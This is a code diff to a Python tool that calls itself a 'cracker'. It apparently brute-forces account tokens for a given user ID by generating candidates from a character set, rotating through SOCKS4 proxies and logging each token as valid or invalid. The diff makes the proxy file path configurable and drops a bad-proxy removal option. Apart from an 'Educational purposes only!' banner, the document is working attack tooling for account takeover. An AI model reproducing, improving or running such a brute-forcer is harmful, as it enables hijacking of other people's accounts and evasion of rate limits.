@@ -14,7 +14,7 @@ with open("config.json", "r") as f:
     data = f.read()
     print(data)
 """
-config = {"cracker_mode": "user","remove_bad_proxy": False,"proxy_timeout": "6000"}
+config = {"cracker_mode": "user","proxy_timeout": "6000","proxy_file_path": "./proxy/socks4.txt"}
 
 try:
     if os.stat("config.json").st_size == 0:
@@ -40,12 +40,13 @@ userid = str(userid)[2:-1]
 print("WARNING: Educational purposes only!")
 
 proxies = set()
-with open("./proxy/socks4.txt", "r") as file:
+with open(data["proxy_file_path"], "r") as file:
     fline = file.readlines()
     for line in fline:
         proxies.add(line.strip())
 
 ts = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"
+
 
 while userid == userid:
     total_proxy = len(list(proxies))
@@ -81,7 +82,5 @@ while userid == userid:
             print(Fore.RED + '[-] INVALID' + ' ' + token)
             invaild += 1
     except:
-        if bool(data["remove_bad_proxy"]) == True:
-            list(proxies).remove(proxy)
         print(Fore.YELLOW + f'[-] BAD PROXY: {proxy}')
         bad_proxy += 1
